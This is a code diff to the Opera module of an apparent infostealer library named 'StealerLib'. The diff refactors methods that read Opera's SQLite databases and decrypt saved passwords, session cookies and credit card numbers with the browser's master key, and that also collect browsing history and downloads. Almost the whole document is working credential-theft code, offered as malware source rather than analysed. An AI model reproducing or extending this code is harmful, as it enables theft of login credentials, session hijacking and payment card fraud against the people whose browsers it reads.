@@ -6,6 +6,7 @@
 """
 
 from stealerlib.browser import *
+from stealerlib.browser.types import BrowserTypes
 
 
 class Opera:
@@ -36,7 +37,7 @@ class Opera:
         self.opera_banking = []
 
     @catch
-    def oget(self, func: callable) -> list:
+    def oget(self, func: callable, conv: bool=True) -> list:
         temp_data = []
 
         for _, path in self.paths.items():
@@ -47,7 +48,7 @@ class Opera:
             if not self.master_key:
                 continue
 
-            data = func(path)
+            data = func(path, conv)
             temp_data.append(data)
 
         return temp_data
@@ -102,16 +103,17 @@ class Opera:
         return decrypted_pass
 
     @catch
-    def _opera_passwords(self, path: str) -> list:
+    def _opera_passwords(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url, username and password from the passed Opera browser by connecting to its database file -
            and decrypting the passwords using the encryption key
 
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the passwords from
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -130,10 +132,14 @@ class Opera:
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2]:
                 continue
-                
-            password = self.decrypt_password(row[2], self.master_key)
-            login = DataTypes.Login(row[0], row[1], password)
-            self.opera_passwords.append(login.conv())
+
+            url, username, password_enc = row
+            password = self.decrypt_password(password_enc, self.master_key)
+            obj_login = BrowserTypes.Login(url, username, password)
+
+            self.opera_passwords.append(
+                obj_login.conv() if conv else obj_login
+            )
 
         cursor.close()
         conn.close()
@@ -142,16 +148,17 @@ class Opera:
         return self.opera_passwords
 
     @catch
-    def _opera_cookies(self, path: str) -> list:
+    def _opera_cookies(self, path: str, conv: bool=True) -> list:
         """Retrieves the site host, cookie name, value and various other information from the passed Opera browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
 
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the cookie information from
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -166,7 +173,7 @@ class Opera:
         conn = sqlite3.connect('cookies_db')
         conn.text_factory = bytes
         cursor = conn.cursor()
-        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
 
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
@@ -174,9 +181,13 @@ class Opera:
 
             row = [x.decode('latin-1') if isinstance(x, bytes) else x for x in row]
 
-            value = self.decrypt_password(row[3], self.master_key)
-            cookie = DataTypes.Cookie(row[0], row[1], row[2], value, row[4])
-            self.opera_cookies.append(cookie.conv())
+            host, name, path, enc_val, expires = row
+            value = self.decrypt_password(enc_val, self.master_key)
+            obj_cookie = BrowserTypes.Cookie(host, name, path, value, expires)
+
+            self.opera_cookies.append(
+                obj_cookie.conv() if conv else obj_cookie
+            )
 
         cursor.close()
         conn.close()
@@ -185,16 +196,17 @@ class Opera:
         return self.opera_cookies
 
     @catch
-    def _opera_history(self, path: str) -> list:
+    def _opera_history(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the web history from
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -213,8 +225,13 @@ class Opera:
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2]:
                 continue
-                
-            self.opera_history.append(DataTypes.Site(row[0], row[1], row[2]))
+
+            url, title, timestamp = row
+            obj_site = BrowserTypes.Site(url, title, timestamp)
+
+            self.opera_history.append(
+                obj_site.conv() if conv else obj_site
+            )
 
         cursor.close()
         conn.close()
@@ -223,16 +240,17 @@ class Opera:
         return self.opera_history
 
     @catch
-    def _opera_downloads(self, path: str) -> list:
+    def _opera_downloads(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the download history from
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -252,8 +270,10 @@ class Opera:
             if not row[0] or not row[1]:
                 continue
 
-            download = DataTypes.Download(row[0], row[1])
-            self.opera_downloads.append(download.conv())
+            obj_download = BrowserTypes.Download(row[0], row[1])
+            self.opera_downloads.append(
+                obj_download.conv() if conv else obj_download
+            )
 
         cursor.close()
         conn.close()
@@ -262,16 +282,17 @@ class Opera:
         return self.opera_downloads
 
     @catch
-    def _opera_credit_cards(self, path: str) -> list:
+    def _opera_credit_cards(self, path: str, conv: bool=True) -> list:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Opera browser -
            by connecting to its database file and parsing the needed data
 
         Parameters:
             self (object): The object passed to the method
             path (str): Opera browser path to get the bank cards from from
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib Object
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             opera = Opera()
@@ -292,8 +313,11 @@ class Opera:
                 continue
 
             card_number = self.decrypt_password(row[3], self.master_key)
-            card = DataTypes.Card(row[0], row[1], row[2], card_number, row[4])
-            self.opera_banking.append(card.conv())
+            obj_card = BrowserTypes.Card(row[0], row[1], row[2], card_number, row[4])
+
+            self.opera_banking.append(
+                obj_card.conv() if conv else obj_card
+            )
 
         cursor.close()
         conn.close()
